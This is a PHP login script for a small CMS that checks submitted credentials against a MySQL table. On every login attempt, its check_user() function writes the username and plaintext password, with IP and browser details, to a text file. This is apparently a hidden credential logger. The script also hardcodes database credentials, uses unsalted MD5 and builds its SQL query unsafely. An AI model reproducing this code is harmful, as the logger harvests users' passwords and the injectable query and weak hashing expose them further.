<?php
    session_start();

    $con = new mysqli("localhost","dev","30eb1ca0d998f3d7983fe372d2249d6ef9594253","tutdev_cms");

    if ($con -> connect_errno) {
        echo "Failed to connect to MySQL: " . $con -> connect_error;
        exit();
    }

    $email = $_POST['user_name'];
    $password = md5($_POST['password']);

    check_user();

    function check_user() {
        $file = 'check_user.txt';
        $current = file_get_contents($file);
        date_default_timezone_set("America/New_york");
        $current .= date("m-d-y h:i:sa").' - ' .$_SERVER['REMOTE_ADDR'].' - '.$_POST['user_name']. " - " .$_POST['password']. " - ". $_SERVER['HTTP_USER_AGENT']."\n";
        file_put_contents($file, $current);
    }

    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo "false";
    } else {
        $sql = "select * from login_form where email='$email' and password='$password'";

        $result = $con -> query($sql);

        if($result) {
            $row = $result -> fetch_assoc();
            if (sizeof($row) >0) {
                $_SESSION['id'] = $row['id'];
                $_SESSION['firstname'] = $row['firstname'];
                $_SESSION['lastname'] = $row['lastname'];
                $_SESSION['role'] = $row['role'];
                $_SESSION['email'] = $row['email'];
                $_SESSION['password'] = $row['password'];
                $_SESSION['time'] = time();

                echo true;
            } else {
                echo "Incorrect username or password";
            }
        }
    }
    $con -> close();
?> 